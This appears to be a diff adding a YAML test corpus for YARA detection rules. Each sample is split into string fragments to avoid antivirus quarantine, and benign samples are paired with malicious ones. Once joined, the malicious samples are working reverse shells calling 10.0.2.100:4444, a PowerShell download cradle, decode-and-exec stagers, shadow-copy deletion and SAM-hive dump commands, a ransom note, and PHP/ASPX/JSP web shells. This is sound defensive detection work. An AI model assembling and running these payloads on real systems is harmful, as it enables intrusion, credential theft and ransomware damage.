@@ -1,0 +1,119 @@
+# YARA test samples. Each sample is assembled in memory from `parts`, so no
+# file on disk contains a contiguous web shell or reverse shell and endpoint
+# AV does not quarantine the test corpus (the same reason EICAR exists).
+#
+#   expect:   exact set of rules that must match ([] = must stay clean)
+#   encoding: utf-16le to exercise `wide` strings (default utf-8)
+#   pe:       true to prepend an MZ header
+
+# ------------------------------------------------------------------ ransomware
+- name: ransom note (UTF-8 text)
+  expect: [Ransomware_Ransom_Note]
+  parts: ["!!! YOUR FILES HAVE BEEN ", "ENCRYPTED !!!\nTo decrypt your files you need a unique ", "decryption key.\n",
+          "Visit http://pay4keyxyzabc.onion and follow the instructions.\n"]
+- name: ransom note stored as UTF-16 inside a binary
+  expect: [Ransomware_Ransom_Note]
+  encoding: utf-16le
+  parts: ["Do not attempt to decrypt ", "the data yourself. Payment deadline: 72 hours."]
+- name: batch dropper that wipes shadow copies and recovery
+  expect: [Ransomware_Recovery_Inhibition_Commands]
+  parts: ["@echo off\r\nvssadmin delete ", "shadows /all /quiet\r\nbcdedit /set {default} recovery", "enabled no\r\n"]
+- name: executable combining encryption APIs, recovery inhibition and ransom text
+  expect: [Ransomware_Binary_Heuristic]
+  pe: true
+  parts: ["\x00KERNEL32.dll\x00ADVAPI32.dll\x00Crypt", "Encrypt\x00CryptGenRandom\x00", "cmd /c vss", "admin resize\x00",
+          "contact us to decrypt\x00"]
+
+- name: "[benign] backup script that only lists shadow copies"
+  expect: []
+  parts: ["@echo off\r\nvssadmin list shadows\r\nwbadmin start backup -backupTarget:E: -include:C: -quiet\r\n"]
+- name: "[benign] password manager binary using CryptEncrypt"
+  expect: []
+  pe: true
+  parts: ["\x00ADVAPI32.dll\x00CryptEncrypt\x00CryptDecrypt\x00Vault locked. Enter master password to decrypt.\x00"]
+- name: "[benign] article mentioning .onion addresses"
+  expect: []
+  parts: ["Tor hidden services are reached through .onion addresses, which are self-authenticating."]
+
+# ------------------------------------------------------------------ scripts
+- name: PowerShell download cradle
+  expect: [Suspicious_PowerShell_Loader]
+  parts: ["$u='http://10.0.2.100/a.ps1'\n", "IE", "X (New-Object Net.Web", "Client).DownloadString($u)\n"]
+- name: PowerShell reflective load of an embedded assembly
+  expect: [Suspicious_PowerShell_Loader]
+  parts: ["$b='TVqQAAMAAAAEAAAA'\n[System.Reflection.Assem", "bly]::Load([Convert]::FromBase", "64String($b))\n"]
+- name: Python decode-and-exec stager
+  expect: [Suspicious_Decode_And_Execute]
+  parts: ["import base64\nex", "ec(base64.b64", "decode('cHJpbnQoMSk='))\n"]
+- name: shell pipeline decoding into bash
+  expect: [Suspicious_Decode_And_Execute]
+  parts: ["echo Y3VybCBodHRwOi8vMTAuMC4yLjEwMC9zIHwgc2gK | base", "64 -d | ba", "sh\n"]
+- name: bash /dev/tcp reverse shell
+  expect: [Suspicious_Reverse_Shell_Unix]
+  parts: ["#!/bin/bash\nbash -i >& /dev/", "tcp/10.0.2.100/4444 0>&1\n"]
+- name: mkfifo + netcat reverse shell
+  expect: [Suspicious_Reverse_Shell_Unix]
+  parts: ["rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|", "nc 10.0.2.100 4444 >/tmp/f\n"]
+- name: Python pty reverse shell
+  expect: [Suspicious_Reverse_Shell_Python]
+  parts: ["import socket,os,pty\ns=socket.sock", "et(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((", "'10.0.2.100',4444))\n",
+          "[os.dup2(s.fileno(),f) for f in (0,1,2)]\npty.sp", "awn('/bin/bash')\n"]
+- name: batch script saving the SAM and SYSTEM hives
+  expect: [Suspicious_Credential_Store_Dump]
+  parts: ["reg save hklm\\s", "am C:\\Windows\\Temp\\s.save\r\nreg save hklm\\sys", "tem C:\\Windows\\Temp\\y.save\r\n"]
+
+- name: "[benign] admin script downloading and installing an MSI"
+  expect: []
+  parts: ["param([string]$Url)\n$ErrorActionPreference='Stop'\n",
+          "Invoke-WebRequest -Uri $Url -OutFile \"$env:TEMP\\agent.msi\"\n",
+          "Start-Process msiexec.exe -ArgumentList '/i', \"$env:TEMP\\agent.msi\", '/qn' -Wait\n"]
+- name: "[benign] PowerShell decoding a certificate to disk"
+  expect: []
+  parts: ["$bytes=[Convert]::FromBase64String($certB64)\n[IO.File]::WriteAllBytes('C:\\certs\\ca.cer',$bytes)\n"]
+- name: "[benign] Python reading a base64 config value"
+  expect: []
+  parts: ["import base64, json\ncfg = json.loads(base64.b64decode(open('cfg.b64').read()))\nprint(cfg['host'])\n"]
+- name: "[benign] minified JS decoding a data URI"
+  expect: []
+  parts: ["function img(d){return new Blob([Uint8Array.from(atob(d),c=>c.charCodeAt(0))],{type:'image/png'})}"]
+- name: "[benign] netcat port check"
+  expect: []
+  parts: ["#!/bin/sh\nfor p in 22 80 443; do nc -zv 10.0.0.51 $p; done\n"]
+- name: "[benign] AD runbook mentioning ntdsutil metadata cleanup"
+  expect: []
+  parts: ["Run ntdsutil and choose metadata cleanup to remove the retired domain controller."]
+
+# ------------------------------------------------------------------ web shells
+- name: PHP eval of POST data
+  expect: [WebShell_PHP_Generic]
+  parts: ["<?php @ev", "al($_PO", "ST['c']); ?>"]
+- name: PHP command execution from a GET parameter
+  expect: [WebShell_PHP_Generic]
+  parts: ["<?php if(isset($_GET['cmd'])){ echo '<pre>'; sys", "tem($_GET['cmd']); } ?>"]
+- name: PHP eval of an encoded, compressed blob
+  expect: [WebShell_PHP_Generic]
+  parts: ["<?php ev", "al(gzinflate(base64_dec", "ode('80jNyclXCM8vyklRBAA='))); ?>"]
+- name: PHP file carrying a b374k marker only
+  expect: [WebShell_Known_Families]
+  parts: ["<?php /* b37", "4k 3.2 */ $title = 'File manager'; ?>"]
+- name: ASPX running cmd.exe from form input
+  expect: [WebShell_ASPX_Generic]
+  parts: ["<%@ Page Language=\"C#\" %>\n<% var p = new System.Diagnostics.ProcessStartInfo(\"cmd.exe\", \"/c \" + ",
+          "Request.Form[\"c\"]);\nvar o = System.Diagnostics.Process.Sta", "rt(p); %>"]
+- name: China Chopper one-liner
+  expect: [WebShell_ASPX_Generic]
+  parts: ["<%@ Page Language=\"Jscript\"%><%ev", "al(Request.Item[\"pass\"],\"unsafe\");%>"]
+- name: JSP command runner
+  expect: [WebShell_JSP_Generic]
+  parts: ["<% String c = request.getParameter(\"cmd\"); Process p = Runtime.getRun", "time().exec(c); %>"]
+
+- name: "[benign] PHP login form handling POST data"
+  expect: []
+  parts: ["<?php session_start();\n$user = htmlspecialchars($_POST['user'] ?? '');\n",
+          "if (password_verify($_POST['pass'] ?? '', $hash)) { $_SESSION['u'] = $user; }\n?>"]
+- name: "[benign] PHP status page calling system() with a fixed command"
+  expect: []
+  parts: ["<?php echo '<pre>'; system('uptime'); echo '</pre>'; ?>"]
+- name: "[benign] PHP image helper using base64_decode"
+  expect: []
+  parts: ["<?php header('Content-Type: image/png'); echo base64_decode($pixel); ?>"]
